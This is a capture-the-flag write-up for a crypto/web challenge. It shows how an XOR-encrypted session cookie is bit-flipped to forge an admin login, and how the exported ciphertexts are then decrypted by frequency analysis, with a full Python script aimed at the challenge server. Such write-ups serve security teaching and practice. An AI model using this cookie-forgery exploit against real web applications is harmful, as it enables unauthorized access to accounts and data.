# Overthecounter - Crypto/web (200)

This wizard book shop has been rumoured to have more than forbidden scrolls. Become admin and find the flag.

Service: http://18.205.93.120:1212

## Analysis

This challenge presented us with a website with a couple different pages for adding "books" to a "bag". After poking around for a bit, we find that each page has a cookie called "session" which is a hex string. This is altered slightly when we add new books. After poking around a bit I found that there wasn't much to go on besides the session cookie, so I started flipping bits of that until I got some interesting error message to pop up. The starter code for this is below, but some interesting error messages that I found were:

```
...
sess_id[35] ^= 1<<0: ['Value error: unknown user: fuest']
sess_id[35] ^= 1<<1: ['Value error: unknown user: euest']
sess_id[35] ^= 1<<2: ['Value error: unknown user: cuest']
sess_id[35] ^= 1<<3: ['Value error: unknown user: ouest']
sess_id[35] ^= 1<<4: ['Value error: unknown user: wuest']
sess_id[35] ^= 1<<5: ['Value error: unknown user: Guest']
sess_id[35] ^= 1<<6: ['Value error: unknown user: &#039;uest']
sess_id[35] ^= 1<<7: ['Value error: unknown user: �uest']
sess_id[36] ^= 1<<0: ['Value error: unknown user: gtest']
sess_id[36] ^= 1<<1: ['Value error: unknown user: gwest']
sess_id[36] ^= 1<<2: ['Value error: unknown user: gqest']
sess_id[36] ^= 1<<3: ['Value error: unknown user: g}est']
sess_id[36] ^= 1<<4: ['Value error: unknown user: geest']
sess_id[36] ^= 1<<5: ['Value error: unknown user: gUest']
sess_id[36] ^= 1<<6: ['Value error: unknown user: g5est']
sess_id[36] ^= 1<<7: ['Value error: unknown user: g�est']
sess_id[37] ^= 1<<0: ['Value error: unknown user: gudst']
...

sess_id[45] ^= 1<<5: ['Key error: &#039;admin&#039;']
sess_id[45] ^= 1<<6: ['Key error: &#039;admin&#039;']
sess_id[45] ^= 1<<7: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<0: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<1: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<2: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<3: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<4: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<5: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<6: ['Key error: &#039;admin&#039;']
sess_id[46] ^= 1<<7: ['Key error: &#039;admin&#039;']
sess_id[47] ^= 1<<0: []
sess_id[47] ^= 1<<1: ['Value error: invalid status: 2']
sess_id[47] ^= 1<<2: ['Value error: invalid status: 4']
sess_id[47] ^= 1<<3: ['Value error: invalid status: 8']
sess_id[47] ^= 1<<4: ['Value error: invalid status:  ']
sess_id[47] ^= 1<<5: ['Value error: invalid status: \x10']
sess_id[47] ^= 1<<6: ['Value error: invalid status: p']
sess_id[47] ^= 1<<7: ['Value error: invalid status: �']
...
```

From these error messages, it was pretty clear that (1) the session cookie was encrypted using a fixed key, likely just XORed in, and (2), there was a username & "admin" status found within it. From here I went about changing the "admin" value to 1 (`sess_id[47] ^= 1<<0` above) which gave the error message "You may not pass yet... Incorrect name" and then XORing in 'admin' over the 'guest' string found in the error messages. Both of these in concert showed that I was now an admin and opened up a new menu item at the endpoint `/vault/export`. Query this page with the right session cookie gave a bunch of hex strings shown below.

```
b93f0c13f582c7b1531fcc7d5dfef63a9436ca72c8bf9ef13108a63bdf16376c4f1b2eac2d4722da4d58e78693d844d0baeecd720373c71eebc74427f370b73dc94dde1e4629
b1250c14fa8982a6484deb7955fcfa6e8e328b52c2a38fa86215a22dd8143b7b4f1b39b431432cd24a43e1d5d6da44cab2f9d6631d73da0faed10d25f561ad2b9b46df5d5b33ed8a452456c9607a
bd381b13fb80cba2484bf73451fcfb2d883e845287ab92fa7403ae29d906376c4f1b37b02e4f24c95756fdc8919c68cabcf884720668c713a2c55e69f779aa3a8103d40b4828fd9d453756c37d
b93e1c08f08982a9415ded6151a9db2b9e368450d4a8dbe96211b521dd1d35775f5a36f52e5732c85742f38684d94cd7a6f9c97103639409aed15f2ce766e52d9c4ad51a0d30ee9b4f314ac36a
bd341c05f889d1aa4d5aa47a5deaf2229032ca59ceaa93fc7704a42bd5523a7155482ef52d4733dd4b41fdc8919c6ecba5ecc1611b75da1eebd6423cfa61a03c994cd20e483e
a0300c04b488cba14f5af7344cfbf23a883e8c5cc2a9dbe76411a03cde053b705b1b32b42f472cc81e65f7c3d6cf43cbbaecc1774f6adb17b2d64120fa7ca63dc957d41241
a739110ce489d0a0441ff17a4ffcf53d88368441ceac8fed7545a62dd016377355587a83345026d25045f5c8d6d559c1b8f5de721b73db15ebc14239fb72b72f994bc25d4c29fc9d5027
be241504e683ceaa4756f7601cecf92d9d248f58c2a38fa85304b520d000363e5f493fb8380231c9514af1d585d542cab4f0cd600674d35ba8d04125b465a03c9a53d21e4c39e6975127
b33d0e08b49bcdab541fe97d5bfbf63a95388415cbb896f86845b42bd507316a554d3fbb3851329b5c59f9cb93d80dd7a1eec5644f7edb0ca5c54128ed35a6268850cf184333e19f
a0231717fb87c7b70052eb665df0e46eb1388441c2bb9efa750ce723d018376d48523fa67d5024df5a49fad5d6ce48c5b1e584701a76db0fbfd05e69e070b52b8c03c80a4235e19d40
a2340e0ef78dd6ac4f51f7344feaff21933b885ac8a6dbc0700bac6ec2073175505e3ef5335722d75b43e7cf92d90dd4a0eecd601b73d75bafda5a2ce666e52f8e44d7085933e199503d50c1
b23e170af182c6e56a6fc1531ceef2238f23855bc2bedbe96306af27d4023b6d5f542ab431022dda4b42f0d493c859c1a6bcc77c0169d709a2c5592cf035b5219956d71c4e3ffc
b4230d08f085d1a8004de17059edfe2d9d238f5187a89afa7d01a82391003768555e2db02f5161c85b4fe0cf99d25e84b1fdc671037f9438aacc582ef566e5258040d0144828
b529080ee785d6aa521ff0754cf9f22adc238f58d7a289e9631ce71ed01f227b4e487aa7384122de4d0cf0c398c858d6b0bcc77c0179d50faedb4c3dfd7aab6e9a53c9145920ea8a
b4381b15fd83cca45256e1671cebe5219732ca7df48fb8a8610ca425d400727a595a3eb93447339b5f5ff1de83dd418497eeca7c4f77db1faec74c3dfb67b66e8546d51a5932f8915731
84391112b48fcdb04c5ba47659a9ee218925ca45c2bf88e77f04ab6ed71e33791c7a15810a5934e44c73f5f981d41cdeaff79577307ec11ff8c80d0ac053e53d864fcd185f
b6340a15fd80cbbf454da46659edf32b9224ca56cfa88afd780ba06ed01e336c515234b27d5220d55b40f8cf85c85e8497eecb640173d108ebd8443af167a42c8546d5185e29
b93f0b00fa85d6bc004bf67552faf1278423ca58c2be96ed630cb42bc301724d70697aa53c5028c85645fbc893ce5e84a6f3cb67067fc70febc34c3bf870b16ea55ad51e45
a03d190ff198c3b7494ae93466e0f521dc278b47c6b993f1630aae2ac252217b5d4c3bb9310224d64e44f5d59fc648c0f5f5ca75037bd916aac1423bed35a423884fdc1c40
8324160ffd98c7b60051e16148fbf62295248f5187a994e76315a83dc5522577504f33bb3a0231c95142fbd398df44cab2bcc07a1c72db15aec65925ed35a6219d57d413593be694
bc381400f7ccd1a9414bec714efab73c9524835bc0ed9ce17c07a622c252397b454b3bb17d4024c95b4de2cf98db0dc9b0fdd7661d73da1cebc24c25ff62a437c947de1e5f33e2914a3552cf747a3a
a33e1600e6cccba8504de1674fe0e12bdc3d8b4287bd88ed610da822de153b6d481b2ab42f5628d84b40f5d49fcf4cd0bcf3ca331c7bc012b8d34c2ae07ab737c953c9125928fa9c41
b93c0804f58fcaa0521ff7615feaf83b8e328e15cda28efa7f04ab27c21f726c534e3dbd334722d05b48b4f581dd45cdb9f584701679d814bfc74227e735a62f9d4bd4114439e68c5d
a321110ff180c7b65351e1674fa9fb219d23825087a99afc7007a620da0172714b1b3db42f4326d2504bb4c283d95e84b7fdc3751a769417ac954028e67cab2b9a03d3144029
80381b0af283d0a1004ce17753e7f3228577895dc6a39fe47417e73ec3173f77445e29f53a4e28d95049e7d5d6cf54cab6f4d67c0173c71eebd45d39fb7cab3a8446d5090d3ee09c40314ccf6078
b1220d0ff089d0e55350e5661ce4fe3d9f388446d3bf8eed3102b22fc316207f555729f5104332da4c55ff86b1d95ed0b4eccb604f5bc712a6da5b69e374a9258c479b194237e69645205b
b23e1705f88982a8415be0714ea9e52b9f388745c8be9ea8590aa921dd073e6b1c5d3bbe3450329b534df7c784d343cdb0ef84700074c01aacdc423ce735b7219c5b9b2d7d
bd3e0a03fd88cca0534ca47c59fbf9279d238f4687be8ce97c15ae2bc2067272595c33ba334333d25b5fb4d499de42c7b4f0c8604f7fcc18a7c05e20e270b66e9b46d81c5d33fb8d48354ac36a
a7381605fd80dbe57750f07552a9fa2f9f3cca54c9a39ef03124b229c401267752523bbb2e022cd25045f9c7d6fe42d7b6f4847b0077d108bfd04c2df167b66e9b42d516413ffc
a3241a15e68dc1b14951e3344be8f42595329815caa29cef6845a422d4133c6d55553df51b4d34c95049edd499d20dd6b0f3c7701a6acd5ba2c64128fa71a03cc940d3124229ea
a0340a11f889daa0441fc77b4ee7f22295229915e3ac89fa7e12e704d4133c77525e7aa2385135de4c42f1d4d6cf43d1b7fecd7d083ac60ea9d00d3de674b32f804f9b0f4836ee8d4a3756c37d
bd38140ae784c3ae454ca46259e7fe3c993a8b5b87b492ec6245a43cde0121714a5e28f5385a22d74b48fdc8919c44caa1eec5661b7fc612a5d00d2ae674ab258a42c8185e
b5291000e19fd6ac565aea714ffab72a993a855bc8a194ef7800b46ed51b216c59482ab03e5627ce5240ed8690d044d4a5f9d6604f69c30ea5d20d28fd71a06e9942c80e4435e18b
b3240a13f582d6b6004fe17554ecf93ddc249a54d5a495ef7d1ce728d0043d6b4e522ebc2e4f61cb5f5efbca93d80dd7bcf8c171007bc61febd4443bf267a0278e4bcf5d5f3fed974d3857c869
b33e140dfd89d0ac454ca47045fae73c93248340caed88e96406a26ed0073677534d33a628432dc81e44f1d5d6cc42cab6f5ca744f7fda08bed05e69f974ae2b9b509b0f423dfa9d57
b33e1511f59ec3a74c46a4735dfdf83c8f778c50d2a992e67645be27d41e366d1c5e2ba03c4028d75758ed869bd340c9acbcd4610669db15aec70d2ae660a0228746c80e0d28ea8b4d305bc87a
a4261115f78482b4555af7601ceffb3b8e258350c3ed89e9650ca820d01e3b6d481b2aba2e5625d45d0cf5c587c944d0a1fdc8604f74db15aad65920e270e5218851c80a4237ea96
92300c09e784c7a7411ff67159e7e32b8e778f47d5ac95ec6245a522de1d366d54542ef5284c29da4a4ffcc3929c5ed0b4e8cd7c0177d508bfd05f69f577b0208d42d51e4829
b33e0d0fe089d0a84553eb7055ece46eb0329c5cc9a8dbe97206a23dc21b3d7055553df53c4034d55a4dfad29ac50dc2a7f9c77803639414a9d3583af774b12bc94ad5094828f9914123
a230110ff98dc9ac4e58a46454e6e32199398d47c6bb92e67645aa21c51d207d455836b0390233de5a45e7d284d54fd1a1f9d733397fc70baac64428fa35b6228044d309433ffc8b
80300a00f780c7b1451fed7059e6fb219b3e8954cbed9fe17f11e722d81137704f5e3ef53f4e24c84d49f08685d042d0f5f4c57f0a699409aec45820e77cb127864d9b194829e69b47354acf6171
b33e0818fd9fd6b6004cf1784ce1e23cdc269f50c2bf88a87d0cb73dc51b31751c482ea7324c26d7470cf7c782df4584a6fdc8661b7bc014b9dc4c27e7358d219c50cf1243
a03e1408e085c1aa531fc77d52edf23c993b8654d4ed9cfa7816ab3791241e581c693bb7384e20d24d45f5c8d6db42c2b0eed7330273c708bbda462cfa35a6218740d7085e33f99d482d
b73d1712e789d1e54350ea795de7b7219e248f47d1ac95fc7d1ce71dd01c267b4e523bf53b432fd85749f08686d341cdb6f5c1604f6fda1caadc4325fd7ba03d9a03d612492fe399503d51c87d
a234190dfa89d1b60053e1735de5fe3495398d15c2b58bed7f16ae38d41e2b3e525a29b4314b3bd2504bb4ee93d543def5f9d27a0179d15b9df10d3bf162a43c8d4ad51a0d2fe18b4a354cca6b7b
b1340a0ef685c1b6004fe5604ee6f93ddc368956cba496e9650ca92991143e7f575e3ef53a4d2fde4c0cf5ca949c7ec1a7ecc17d1c3af117aadb423bb474b63a9b4ad51a4834fb945d
bc380b15f889d1b6004ceb614eece56e8f278547d3be98e96211a23c9100377d494b3fa73c5628d5590cf0c984d548d7f5efc7610e6dda12a5d05e3ab477a43c8050cf1c0d3beb92513057c56f6b3bd3
b1231f14f989ccb1004de17255e7f23c8f778e50d3a898fc780ba06ed91d2070451b36b43e4b2fdc1e5ef1d199ca48caf5f4c57f036fd712a5da4a2cfa35a33c8853cb180d37ee9f4127
b4380b03f180cba0565af6345ae5f8299b32984687b98ee67403b22291013b7349572eb4334728cf470ce1c89edd41c8baebc1774f75d70faac34269e070a92b9f4ac8185e
a3381c04f59ecfb60072ed674fe0e43d9d228d5487bd89e77b00a43a911322775d4923f53e4331cf5f45fac3929c45cbb8f3ca6a023adc1ab9d04120e465a02ac946c30d4c34fc914b3a4d
bd301b09fd82c3b1454ca4755be5fe3a88329815c0b895a86300a620d01e2b6d59487ab73c4028de5a0ce0c998d95e84b9f3c2670674d35ba8c05f28f679a06e8851d8164434e8
bc3e170af18882b7495cec345eecf63a9925ca56c8b897ec3107b521d016213e485e29a13447339b5b5de1cf80dd41c1bbe8d7331d7fde0ebdd04328e070a16e884dcf1849
b4380e08fa89d1b1005cec7b5fe2e46e9d308d47c6bb9afc780aa93d91133e72554f3fa73c5628d5590cfbd682d540cda6f9847e0e68dd15aec70d3af163a03c804ddc5d5d29f69b4c3b5ad46f723f
be380008fa8b82a15250ea7158a9fe2990388515f3bf9efe780ba86ec3173670595831a67d412ed65345e0d293d940c5bbbcd772097fc002ebc5483be274a12b9a03d9114235eb9441274d
b33e160be19ecbab471ff77c5dfbf22d8e389a45c2bf88a84504a02fdd1d353e5d4938bc295020cf5742f3869fd259c1a7f0cd7d0674d35bacd05f24fd76ac2a8c03f3184f3f
a3211408fa98c7b7531ff46653eee52b8f248343c2ed8be7630be73ede05367b4e1b2aa7324c26d3515efa8683d25fc1b8f9c9710a68d11febf7423cf870bf6ea242dd164c
be240c15edccc1aa545af67d59a9f12f9f3e865cd3ac8fed3126a83bc3063c7b451b2eb43a4e28da4a49f8ca939c4ed6bae9d46a4f7bc40baec75928fd7be5298c46c8180d39ee8d483d58ca61683bc5
83300d0ff089d0b60058eb615becf36e9e22865ccaa498a86215a222dd1b3c791c5835bb3b4733c95b5ee78694dd41c8acf4cb7c1c3ad914bec14569e770ab3a9b5a9b1c5f39e799413b52c969763dd61a
97241707f182c5e54d5aea7d52eef22f90778940d5be94fa3101a238d8133c7d591b2db42f4729d44b5ff18693d259d3bcf2c133027bc61ca2db4c25fd66a02ac94fda0f5b3bea
a7231d02ff89d0e5554ded7a59a9e72f8e238450d5a89fa8770ab52bd31d3677525c7a98384e31d45349fac3d6db5fdda5f4cb7d1c3ad50debc15824fd71e50d8851ce0e42
b6300d19b48bd0ac534be97d50e5e46e88368452c8ed92e67500a53ad4163c7b4f487ab0344624c94d0cf5d492c942d1a6f0dd331b7fc70fa2d35420fa72e5228850cf14433de381
b7380a15fcccccb0524bf16659fbe46e9f36895dc2b988a87808b722d41f377048487ab6325424c95249e08690d358c8b4eec033016fd717aec05e2ce735a73b9b46da084e28ee8c
b33d1715e089c6e5614bec7152e8b72d9d25875cc9a888a87700a43bdf16336a591b1cb9244c2f9b5d44fdca92d144cab1f5ca744f78cd01aadb5920fa70e5388c44da130d2afd9d40354acf6078
a3250a08e49ccbab471fd77550a9f62a96328941cebb9efb3100a93ac3133c6a1c5823b7385023ce5240ed8695d359c1f5ecc1770a69c009a2d44320ee70b66e8a4adc1c5f
a0340a17f59fcbb34553fd3459fffe228f77825acba99ae47d459521db13213e5e4e38b73147329b595efdc892cf59cbbbf98470006fd713a2db4a69e27cb62b8d03d91c5f34fc8c4b2653c37c6c
b13d1f0ee685d6ad4d1ff46152eef22088779f5bc3a889eb7e04b327df15213e515e3eb1314761c95b47fdc892d048d7f5f4cb661c7fc31ab9d05e69d274b73d8003f9184136e6964d
be3e1614e789d0e5525ae97d44e0f929dc1b8547cea8dbe77313ae21c401726d485e3fa5314722d35f5ff186a1dd41cfb0ee847c037f9430aad75825b476a4209d42d5164828e08d57
b4231103f680c7a10058e5704fa9f32b8f348f5bc3ac95fc6245a426d01b206953563bbb7d5120d55a4ef8c785c848d6a6bcc0761c6ad512b9954530e47ab1268c50d20e48
b23d1902ff84c7a4441fe97d4fece52285778947c6ae90fd6145a236d21b267b4f1b3ca0295824c81e5ffcc986cf0dc5b1eac17d1b6fc61eb8956c3bfd7ab63a8603d1124534e1914127
a03e0b04b49fc1b7455ae77c59fab729903e9e56cfa495ef3116b337dc1b377a1c5835bb29432cd2504de0c3d6de48cab0fac5701b75c65b8ddc4327b462a02f8246d51849
b4341915fc98d0a4504ca47955fafe2a99399e5cc1b4dbc57017aa2fc3137277524f3fa7374722cf5743fa86a0d55bcdb4f28474007ed01aa6db482db467a0388050d2124333fc8c57
b33e1612e09ecba65456ea731cfcf93c99269f5cd3a89fa8770ab52cd8163677525c7aa5324e38dc5f41fdd5829c6eccb4ecd17f1b7fc41ea8955e39fd67ac3a9c42d71154
b93c1a00f88dcca6455ba47255fbf22c8930ca78c6b49afb3117a228d81c3b6d545e29f52d502ecf4c4df7d293d80dd0b4e4cd770a68d902ebd44923e171ac2d8857d2124329
a53f1a13f18dc9a44253e13471e0f33999249e15d0a289e37417e73cc41f7277524f3fa7370225d44d5ffdc384cf0dc1adecc87c1d7fc65bacd45f2efb6ca92b9a03de055d2fe19f4d3a59
a4231103f19fcfa04e1fee7b48fdf23cdc348547cabedbfb6600a63ac252336a454b33b63c4e61df575fe0d497c94acca1bcd6761c6ad117a7d04969e17ba626884ddc184c38e39d
b2231902f19f82a45256f07c51ece3279f779850cea38fed7617a63ad81d3c3e4f5328bc314e24df1e4af8c984d55ed0a6bcd076176edd15ac954b3cfa7ba0228546df5d4a28ee96402751c87d
b32b1913e7ccd1a45251ed714fa9f63e8c24ca5fd2a38fe93121a620d8173e3e5d573bb6360232d55f58f7ce93cf0dd7a0fac27a0c7f9429a4d84c27e77de52d9b46df120d3dfd91403052c3
b7341614e789d1e54c5eea704fe5fe3edc338f51d2ae8fe17f02e720c41f376c55583bb97d4c24da5048f1d482d44cc8a6bcf37a0371dd15b8954427e77ca2269d509b0e453bfb8c412657c869
b7341614fd82c7e54456eb7059a9e5278f3cca47c8a296e57011a23d911c37694f5a3db0335661dc5b5fe0c782d543c3f5d1ed474f6fda13aed45f2db47baa388c4fd20e483e
8330140dfd8982b54c5ae07359a9f83899259c54cbb89eec3113ae3dc4133e77465e7ab9344c24da5949b4c493cf48c1b8f9c033276fd817ebdd4c2afd70ab2a88509b18473bec8d48354ac97c66
b4341408f384d6a04453fd344be0fb28893b864c87a883f87011b46ef31b287b481b18b0334725d25d58fdc893cf0dc5b6e8d1720373ce1abfdc4227b44fb6278e4ed4134923
ba3e1304e69f828e414de5795df3f838dc2e8547c2ed89fd7c15ab2bd55231714a5e23f5314322de4c4de0c3929c5accb0f2d77c0a6cd109ebf6422ff270bc6eaa4fda085e3ff891502e
92380b09fb9c82a8554bed7a59ece53ddc198356cfa297ed3110b73cd413206d1c4b36b43e4333df1e4df5ced6c84cc7a1f5c77a0e74c75ba6d05e3ab47fb020825ada0f49
9c34190ffa8d82844e5be1664fe6f96e8d228350d3ed9ce97703a23d91013e77525c7ab8324c26de5b5ff1869bd35fd0b2fdc3761c3ad714a8da4c69f070a9278b46c91c5933e09657
a0300c13fd83d6ac5352a46049fbf5219a368415c0a495ef7417ae20d6523667595f7aa22f4732cf5249e68685df4ccab1f5d17e4f6dd50faec74126f372a02ac947d40a432efa8a4a27
b2301b09f180cdb7005be1775df9fe3a9d238f15f7b495eb790aa96ec202377d555d33b62e0225de585efbc59dd94984b6f3d17d1b7fc61eaf954b20e670b73dc944de13583ce39d472057c869
b3230d0ce480c7a1007ce87d5efce520dc3f8b46d3a8dbeb7e0ba42bc31c377a1c573bbb385161e95141e1ca83cf0dd0b0ffcc7d003ac70fa4c74822f170b52b9b509b195f35fa9f4c20
a53f0a04f580cbb65456e77550e5ee6e99399940d5a495ef3106ab2fdc1d276c55553df5334335ce4c4df8cf85d90dc0b0eac5601b7bc012a4db0d25f560ab2d8146c85d5b3fe197493b4bd56266
b6300c41e780cda0531fd76152edf62099248f15d3a59eff3115a23cd80131714c5e7aa033402ed74a0ce7d284d959c7bdf1c56104699412a5d3583af166e53d8a42c9184035e19f41264d
b2240a0df19fd3b0454ca47955fafa2f88348250c3ed9ffd6700b36ec317386b585c3fa67d572dce524de0cf99d25e84b7eecd621a7fc05ba8c7423ae765ac2b8a46c85d403fe3914b265fd267693b
a0380a0ee189d6b14951e3344cfbf22489338356ceac97a87d0cb33add17726f495e3ba6344c24c84d0cd7c99ad34acab0bcc77c1d71c718b9d05a20fa72e53b8740d31c433dea9946385b
9c380b03fb8282a44e51ed7c55e5f63a93259915c2a38ded7f0aaa27df15726d4b5a36b9325535da5740b4ca99df4cd0b0f884770077d108bfdc4e28e070a16e8f54df5d483bfb914a33
b63d0d02e099c3b1455ba47650e6f42594389f46c2bedbc57809ab3d91053b6855553df5325424c94c59f8cf98db0dd7b0f1c57d1b73d708ebf05e3df577a9279a4bd618432e
b33e1e07fd82d1e5435af7754eecf6208f77895cc9a39aea7017e73ac3133c6d5a5222b0390223d44b42e0cf90c941cab0efd733187bd710ebd64c3bf77cab218442cf1c0d3eea9b413d48c3
a03e1418fc89c6b74f51f7345fe1e521913e845287a99ee57816a22a91113d73514e34bc3e4335d25142b4c49ad540d4bcefcc330d6fd817a3d04c2df171a937c94eda0442
a2341b0efa82cdac544de1671cecf63d95398f46d4ed99e17602ae2b9100377f50522ebc385161df575ff8cf9dd543c3f5f8d67c1f75c10fb8956528e374ac27884d9b094420f5
bc341711f59ec6a0534ca47144f9fb279f369e5cc8a3dbdb740ca92b91163773555733a13c5028c15742f3869ad94ccfacbcd7640674d15baac24c3bf07cab29c950ce104c39e7
89241f0eb481c3b1554de17845a9f33c95218f5987ac95fc7815a63ad91726775f1b33bb345628da5245eec3929c4fc1a6ecc172043ac009a2c14825ed35aa388c51d812403ffc
b2240a0ffd9fcaa0441ff0614ef9fe3a89338f15d4a883fc7e0bb46ed4133572594f29f53e4d2cd65f42f0c384cf0df7b0e884700776db09afd4432cb467a0278755d21a4228ee8c41
b4230141f983d6ad454de87d52ece43ddc1e8451ceac95fb3106a63cd213216d1c5f33b13a4733d25a43fb8691dd41d1b8eccc7a017d9437bed64428b471a02d8050d2124329
```

To fit with the theme of XORing key overtop of plaintext, I took out some old code I used to solve [one of the cryptopals challenges](http://cryptopals.com/sets/3/challenges/20) and re-purposed it to decrypt each line of ciphertext. With all of these decrypted, a simple search found that the flag was included in one of them.

## Solution

Full code for the description above is below:

```python
import requests
import binascii
import re
import sys

def xor(s1,s2,is_hex=True):
	if len(s1) != len(s2):
		return
	if is_hex:
		s1 = binascii.unhexlify(s1)
		s2 = binascii.unhexlify(s2)
	s3 = bytes([s1[i]^s2[i] for i in range(len(s1))])
	if is_hex:
		s3 = binascii.hexlify(s3)
	return s3

def get_warning(text):
	arr = []
	pat = re.compile('<p class="warning">(.*?)</p>')
	for match in re.finditer(pat,text):
		arr.append(match.group(1))
		#print(match.group(1))
	return arr

FREQCT = None
def generate_freqct():
	global FREQCT
	if FREQCT is not None:
		return FREQCT
	freqct = {
		'e':21912,
		't':16587,
		'a':14810,
		'o':14003,
		'i':13318,
		'n':12666,
		's':11450,
		'r':10977,
		'h':10795,
		'd':7874,
		'l':7253,
		'u':5246,
		'c':4943,
		'm':4761,
		'f':4200,
		'y':3853,
		'w':3819,
		'g':3693,
		'p':3316,
		'b':2715,
		'v':2019,
		'k':1257,
		'x':315,
		'q':205,
		'j':188,
		'z':128,
		' ':40000,
		'.':4000,
	}

	for ch in 'abcdefghijklmnopqrstuvwxyz':
		freqct[ch.upper()] = freqct[ch]

	_freqct = {}
	for ch in range(256):
		if chr(ch) not in freqct:
			_freqct[ch] = 1
		else:
			_freqct[ch] = freqct[chr(ch)]

	freqct = _freqct

	s = sum(freqct.values())
	freqct = dict((ch,256.*freqct[ch]/s) for ch in freqct)
	FREQCT = freqct
	return freqct

def score_ascii(st):
	freqct = generate_freqct()
	score = 1.
	for ch in st:
		score = score * freqct[ch]
	return score

def key_solver(ciphertexts):
	ciphertexts = [binascii.unhexlify(ct) for ct in ciphertexts]

	key_solve = []
	for pos in range(max(len(ct) for ct in ciphertexts)):
		max_score = 0
		ans = None
		for k in range(256):
			plain_chars = [ct[pos]^k for ct in ciphertexts if len(ct) > pos]
			sc = score_ascii(plain_chars)
			if sc > max_score:
				max_score = sc
				ans = k
		key_solve.append(ans)
	key_solve = bytes(key_solve)

	for ct in ciphertexts:
		print(xor(key_solve[:len(ct)],ct,is_hex=False))

	print(key_solve)
	print(len(key_solve))
	return key_solve

if __name__ == '__main__':

	sess_id = 'e161495ca4ca93f51202b6320db9a473cc71db0593f0caae2753f1738154276d594967b2284732cf184df0cb9fd21094f3f5c02e5f2b8148fd8d497da020a47ddd108a184f6bb9cb13370ac33a2d6e8e450d4e60'
	sess_id_bin = binascii.unhexlify(sess_id)

	#'''
	# flip each bit in the session id
	for i in range(len(sess_id_bin)):
		for j in range(8):
			_new_bin = sess_id_bin[:i] + bytes([sess_id_bin[i]^(1<<j)]) + sess_id_bin[i+1:]
			_new_sess = binascii.hexlify(_new_bin).decode('ascii')

			r = requests.get('http://18.205.93.120:1212/bag',headers={'Cookie':'session='+_new_sess})
			arr = get_warning(r.text)
			print('sess_id[%d] ^= 1<<%d:'%(i,j), arr)

	sys.exit(0)
	#'''

	# this bit seems to be associated with admin=1
	_new_bin = sess_id_bin[:47] + bytes([sess_id_bin[47]^1]) + sess_id_bin[48:]
	_new_sess = binascii.hexlify(_new_bin).decode('ascii')
	r = requests.get('http://18.205.93.120:1212/bag',headers={'Cookie':'session='+_new_sess})
	print(r.text)

	# now we try to get /vault
	r = requests.get('http://18.205.93.120:1212/vault',headers={'Cookie':'session='+_new_sess})
	print(r.text)

	# set our name from 'guest' to 'admin'
	_new_bin = sess_id_bin[:47] + bytes([sess_id_bin[47]^1]) + sess_id_bin[48:]
	_new_bin = _new_bin[:35] + bytes([_new_bin[35]^ord('g')^ord('a')]) + _new_bin[36:]
	_new_bin = _new_bin[:36] + bytes([_new_bin[36]^ord('u')^ord('d')]) + _new_bin[37:]
	_new_bin = _new_bin[:37] + bytes([_new_bin[37]^ord('e')^ord('m')]) + _new_bin[38:]
	_new_bin = _new_bin[:38] + bytes([_new_bin[38]^ord('s')^ord('i')]) + _new_bin[39:]
	_new_bin = _new_bin[:39] + bytes([_new_bin[39]^ord('t')^ord('n')]) + _new_bin[40:]
	_new_sess = binascii.hexlify(_new_bin).decode('ascii')

	# request the /vault again
	r = requests.get('http://18.205.93.120:1212/vault',headers={'Cookie':'session='+_new_sess})
	print(r.text)

	# now request /vault/export
	r = requests.get('http://18.205.93.120:1212/vault/export',headers={'Cookie':'session='+_new_sess})
	print(r.text)

	# solve for the key
	key_solver(r.text.strip().split())
```
